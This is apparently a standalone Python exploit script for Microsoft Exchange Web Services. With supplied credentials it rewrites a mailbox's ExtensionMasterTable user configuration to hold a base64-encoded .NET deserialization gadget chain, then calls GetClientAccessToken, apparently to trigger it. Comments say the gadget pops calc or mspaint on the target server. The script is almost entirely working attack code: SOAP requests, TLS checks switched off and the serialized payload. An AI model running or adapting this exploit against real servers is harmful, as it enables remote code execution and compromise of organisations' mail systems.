#!/usr/bin/python
import socket, time

import httplib, requests
import urllib
import os, ssl

from requests_ntlm2 import HttpNtlmAuth
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
import base64


USER = ''
PASS = ''

target = "https://target"

#rcegadget
#pop calc or mspaint on the target
#hiddenObject//Exp
gadgetData = 'AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAgAAAA9Gb3JlZ3JvdW5kQnJ1c2gPQmFja2dyb3VuZEJydXNoAQECAAAABgMAAABtPExpbmVhckdyYWRpZW50QnJ1c2ggeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiI+PC9MaW5lYXJHcmFkaWVudEJydXNoPgYEAAAA6w08UmVzb3VyY2VEaWN0aW9uYXJ5DQp4bWxucz0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwvcHJlc2VudGF0aW9uIg0KeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQp4bWxuczpzPSJjbHItbmFtZXNwYWNlOlN5c3RlbTthc3NlbWJseT1tc2NvcmxpYiINCnhtbG5zOmM9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkNvbmZpZ3VyYXRpb247YXNzZW1ibHk9U3lzdGVtLkNvbmZpZ3VyYXRpb24iDQp4bWxuczpyPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5SZWZsZWN0aW9uO2Fzc2VtYmx5PW1zY29ybGliIj4NCiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJ0eXBlIiBPYmplY3RUeXBlPSJ7eDpUeXBlIHM6VHlwZX0iIE1ldGhvZE5hbWU9IkdldFR5cGUiPg0KICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICA8czpTdHJpbmc+U3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLkFwcFNldHRpbmdzLCBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWwsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1PC9zOlN0cmluZz4NCiAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJmaWVsZCIgT2JqZWN0SW5zdGFuY2U9IntTdGF0aWNSZXNvdXJjZSB0eXBlfSIgTWV0aG9kTmFtZT0iR2V0RmllbGQiPg0KICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICA8czpTdHJpbmc+ZGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgPHI6QmluZGluZ0ZsYWdzPjQwPC9yOkJpbmRpbmdGbGFncz4NCiAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJzZXQiIE9iamVjdEluc3RhbmNlPSJ7U3RhdGljUmVzb3VyY2UgZmllbGR9IiBNZXRob2ROYW1lPSJTZXRWYWx1ZSI+DQogICAgICAgIDxPYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICAgICAgICAgIDxzOk9iamVjdC8+DQogICAgICAgICAgICA8czpCb29sZWFuPnRydWU8L3M6Qm9vbGVhbj4NCiAgICAgICAgPC9PYmplY3REYXRhUHJvdmlkZXIuTWV0aG9kUGFyYW1ldGVycz4NCiAgICA8L09iamVjdERhdGFQcm92aWRlcj4NCiAgICA8T2JqZWN0RGF0YVByb3ZpZGVyIHg6S2V5PSJzZXRNZXRob2QiIE9iamVjdEluc3RhbmNlPSJ7eDpTdGF0aWMgYzpDb25maWd1cmF0aW9uTWFuYWdlci5BcHBTZXR0aW5nc30iIE1ldGhvZE5hbWUgPSJTZXQiPg0KICAgICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgICAgICA8czpTdHJpbmc+bWljcm9zb2Z0OldvcmtmbG93Q29tcG9uZW50TW9kZWw6RGlzYWJsZUFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3JUeXBlQ2hlY2s8L3M6U3RyaW5nPg0KICAgICAgICAgICAgPHM6U3RyaW5nPnRydWU8L3M6U3RyaW5nPg0KICAgICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPg0KICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyPg0KPC9SZXNvdXJjZURpY3Rpb25hcnk+Cw=='
#PIgadgetData = 'U2hlIHBsYXllZCB5b3UsIGJyby4uLg=='

def sendPayload(gadgetChain):
	get_inbox = '''<?xml version="1.0" encoding="utf-8"?>
	<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	  <soap:Header>
		<t:RequestServerVersion Version="Exchange2013" />
	  </soap:Header>
	  <soap:Body>
		<m:GetFolder>
		  <m:FolderShape>
			<t:BaseShape>AllProperties</t:BaseShape>
		  </m:FolderShape>
		  <m:FolderIds>
			<t:DistinguishedFolderId Id="inbox" />
		  </m:FolderIds>
		</m:GetFolder>
	  </soap:Body>
	</soap:Envelope>
	'''

	headers = {"User-Agent": "ExchangeServicesClient/15.01.2308.008", "Content-type" : "text/xml; charset=utf-8"}

	res = requests.post(target + "/ews/exchange.asmx", 
				data=get_inbox, 
				headers=headers, 
							verify=False, 
							auth=HttpNtlmAuth('%s' % (USER), 
							PASS))


	folderId = res.content.split('<t:FolderId Id="')[1].split('"')[0]
	changeKey = res.content.split('<t:FolderId Id="' + folderId + '" ChangeKey="')[1].split('"')[0]


	delete_old = '''<?xml version="1.0" encoding="utf-8"?>
	<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	  <soap:Header>
		<t:RequestServerVersion Version="Exchange2013" />
	  </soap:Header>
	  <soap:Body>
		<m:DeleteUserConfiguration>
		  <m:UserConfigurationName Name="ExtensionMasterTable">
			<t:FolderId Id="%s" ChangeKey="%s" />
		  </m:UserConfigurationName>
		</m:DeleteUserConfiguration>
	  </soap:Body>
	</soap:Envelope>''' % (folderId, changeKey)

	res = requests.post(target + "/ews/exchange.asmx", 
				data=delete_old, 
				headers=headers, 
							verify=False, 
							auth=HttpNtlmAuth('%s' % (USER), 
							PASS))

	create_usr_cfg = '''<?xml version="1.0" encoding="utf-8"?>
	<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	  <soap:Header>
		<t:RequestServerVersion Version="Exchange2013" />
	  </soap:Header>
	  <soap:Body>
		<m:CreateUserConfiguration>
		  <m:UserConfiguration>
			<t:UserConfigurationName Name="ExtensionMasterTable">
			  <t:FolderId Id="%s" ChangeKey="%s" />
			</t:UserConfigurationName>
			<t:Dictionary>
			  <t:DictionaryEntry>
				<t:DictionaryKey>
				  <t:Type>String</t:Type>
				  <t:Value>OrgChkTm</t:Value>
				</t:DictionaryKey>
				<t:DictionaryValue>
				  <t:Type>Integer64</t:Type>
				  <t:Value>637728170914745525</t:Value>
				</t:DictionaryValue>
			  </t:DictionaryEntry>
			  <t:DictionaryEntry>
				<t:DictionaryKey>
				  <t:Type>String</t:Type>
				  <t:Value>OrgDO</t:Value>
				</t:DictionaryKey>
				<t:DictionaryValue>
				  <t:Type>Boolean</t:Type>
				  <t:Value>false</t:Value>
				</t:DictionaryValue>
			  </t:DictionaryEntry>
			  <t:DictionaryEntry>
				<t:DictionaryKey>
				  <t:Type>String</t:Type>
				  <t:Value>OrgExtV</t:Value>
				</t:DictionaryKey>
				<t:DictionaryValue>
				  <t:Type>Integer32</t:Type>
				  <t:Value>2147483647</t:Value>
				</t:DictionaryValue>
			  </t:DictionaryEntry>
			</t:Dictionary>
			<t:BinaryData>%s</t:BinaryData>
		  </m:UserConfiguration>
		</m:CreateUserConfiguration>
	  </soap:Body>
	</soap:Envelope>''' % (folderId, changeKey, gadgetChain)

	res = requests.post(target + "/ews/exchange.asmx", 
				data=create_usr_cfg, 
				headers=headers, 
							verify=False, 
							auth=HttpNtlmAuth('%s' % (USER), 
							PASS))


	get_client_ext = '''<?xml version="1.0" encoding="utf-8"?>
	<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
	  <soap:Header>
		<t:RequestServerVersion Version="Exchange2013" />
	  </soap:Header>
	  <soap:Body>
		<m:GetClientAccessToken>
		  <m:TokenRequests>
			<t:TokenRequest>
			  <t:Id>aaaa</t:Id>
			  <t:TokenType>CallerIdentity</t:TokenType>
			</t:TokenRequest>
		  </m:TokenRequests>
		</m:GetClientAccessToken>
	  </soap:Body>
	</soap:Envelope>
	'''

	res = requests.post(target + "/ews/exchange.asmx", 
				data=get_client_ext, 
				headers=headers, 
							verify=False, 
							auth=HttpNtlmAuth('%s' % (USER), 
							PASS))

sendPayload(gadgetData)